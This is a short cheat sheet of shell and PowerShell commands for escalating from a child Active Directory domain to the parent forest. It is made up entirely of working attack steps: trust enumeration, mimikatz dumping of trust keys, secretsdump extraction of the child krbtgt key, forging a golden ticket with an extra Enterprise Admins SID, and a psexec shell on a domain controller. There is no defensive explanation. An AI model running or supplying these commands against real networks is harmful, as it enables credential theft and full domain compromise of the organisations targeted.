```powershell
Get-ADTrust -Filter * # Enumeration
```

```powershell
.\mimikatz "privilege::debug" "token::elevate" "lsadump::trust /patch" exit # Get domain SIDs
```

```shell
secretsdump -hashes :$HASH $CHILD_DOMAIN/$USERNAME@$TARGET # Run it on child DC to extract "krbtgt:aes256-cts-hmac-sha1-96" value on child
```

```shell
ticketer.py -aesKey $AES_KEY -domain-sid $CHILD_DOMAIN_SID -domain $CHILD_DOMAIN -extra-sid $PARENT_DOMAIN_SID-519 administrator -extra-pac
```

```shell
export KRB5CCNAME=administrator.ccache
```

```shell
psexec.py $CHILD_DOMAIN/administrator@$TARGET -k -no-pass # TARGET is like DC01
```